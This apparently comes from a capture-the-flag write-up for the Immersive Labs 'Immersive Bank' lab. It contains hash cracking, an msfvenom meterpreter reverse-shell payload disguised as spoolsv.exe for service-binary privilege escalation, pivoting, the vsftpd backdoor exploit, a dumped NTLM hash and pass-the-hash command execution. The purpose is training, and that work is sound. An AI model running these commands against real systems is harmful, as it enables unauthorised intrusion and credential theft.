---
date: 2025-03-07
categories: [CTF, ImmersiveLabs]
title: "IML - Immersive Bank"
tags: ['ftp', 'hashdump', 'john the ripper', 'privilege escalation', 'rce', 'reverse shell', 'smb', 'windows']

description: "Immersive Bank - A walkthrough of the challenge with enumeration, exploitation and privilege escalation steps."
---

---
---

# IML - Immersive Bank

**<u>Immersive Bank: Ep.1 – Open Source and Credentials</u>**
```bash
john hash /usr/share/wordlists/rockyou.txt --format=raw-sha256S

```

![image1](../resources/5a9da1d38d9441d98ec574c0ffb4167f.png)


![image2](../resources/ff8b07f220184b248f67c606e02f9cb2.png)

**<u>Immersive Bank: Ep. 2 – Gaining Access</u>**
```bash
xfreerdp /v:10.102.189.120:8877 /u:carlof /p:manunited +clipboard +drives /drive:root,/home/kali /dynamic-resolution /cert:ignore

```

![image3](../resources/cb678f99260b4d77a1dab3ca4c44216b.png)

**<u>Immersive Bank: Ep.3 – Privilege Escalation</u>**
```bash
xfreerdp /v:10.102.118.107:8877 /u:carlof /p:manunited +clipboard +drives /drive:root,/home/kali /dynamic-resolution /cert:ignore

```
Troubleshooting file in C:\IMLBankIT


![image4](../resources/88128aa965a04ed0ac96f26867735f29.png)


![image5](../resources/877f385f297546559a08df9e6e23d37d.png)

```bash
sc query spooler

```

![image6](../resources/ac759a27b55043848b971c7a027f940f.png)

- Create a reverse shell named spoolsv.exe
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.102.170.0 LPORT=4445 -f exe -o spoolsv.exe

```
- Set up listener
```bash
msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost 10.102.170.0; set lport 4445; exploit"

```
- Transfer the malicious exe and replace the original

- Start service:
```bash
sc start spooler

```

![image7](../resources/2932eb0ce39f4c62b97c6bff51ff6b1d.png)

- Migrate to a more stable process:
```bash
ps

migrate -N LogonUI.exe

```

![image8](../resources/7f9c57411e0e4f59b9f889983c4b05f2.png)


cat C:\Users\Administrator\Desktop\token.txt


**<u>Immersive Bank: Ep.4 – Pivoting</u>**

```bash
xfreerdp /v:10.102.146.57:8877 /u:carlof /p:manunited +clipboard +drives /drive:root,/home/kali /dynamic-resolution /cert:ignore

```

![image9](../resources/f08f524068394b3897f76128fb2a307a.png)

- Do above exploit first to get SYSTEM and migrate to a more stable process

- Ping the FTP server to see if we can talk to it

![image10](../resources/a989c28fb914484d9688ace7e54588da.png)

- Background current meterpreter session (bg):

![image11](../resources/afcfabd38ef1469f974786de9ca2124e.png)

- Now we need to add a route to the FTP server:
```bash
route add 10.102.36.63 255.255.255.255 1

```

![image12](../resources/52f0db74f48147e98ec6c4a5ea0746fc.png)

- Back to the session:
```bash
sessions 1

```
- Forward port 3000 on our localhost to port 21 on the FTP server:
```bash
portfwd add -l 3000 -p 21 -r 10.102.36.63

```

![image13](../resources/9c146bdd6c44465c8a4e427a3400a9d0.png)

- Open another terminal

Banner grab with nc or ftp:

```bash
nc 127.0.0.1 3000

```

![image14](../resources/d4298ca418c1452882729f07eed0aad7.png)


![image15](../resources/d7f7f68f0c37441085fbbe2a0edcfe70.png)

- Background current meterpreter session:
```bash
bg
```

- Search for vsftpd in msf and use the following payload:
```bash
use exploit/unix/ftp/vsftpd_234_backdoor
set rhosts 10.102.36.63  #Because route was added
set rport 21

```

![image16](../resources/3b18d9c8b1d04027a0569275690c1a27.png)


![image17](../resources/c0fa403808ce4f60bbdf40d93421bbdc.png)

**\*\*Tip** - before going on to Ep.5 - Do a hashdump in meterpreter and save the manager hash

**<u>Immersive Bank: Ep.5 – Account Abuse</u>**
- If you didn't save the hash on Ep.4 - you need to do the whole priv esc part again and in meterpreter, do a hashdump:

![image18](../resources/77e33bc5545047ccafe4f89b8a61a53b.png)

manager:1002:aad3b435b51404eeaad3b435b51404ee:**66ece2b7200f29cbd0b799350c29244e**:::

- We can check the credentials with CME:
```bash
crackmapexec smb 10.102.154.232 -u manager -H 66ece2b7200f29cbd0b799350c29244e

```

![image19](../resources/a31d5f5b29d745d1a259b508479988a7.png)

- We can also execute commands through CME:
```bash
crackmapexec smb 10.102.154.232 -u manager -H 66ece2b7200f29cbd0b799350c29244e -x 'type C:\Users\manager\Desktop\token.txt'

```

![image20](../resources/b52cd74f9da74350835fa359aca1d24a.png)
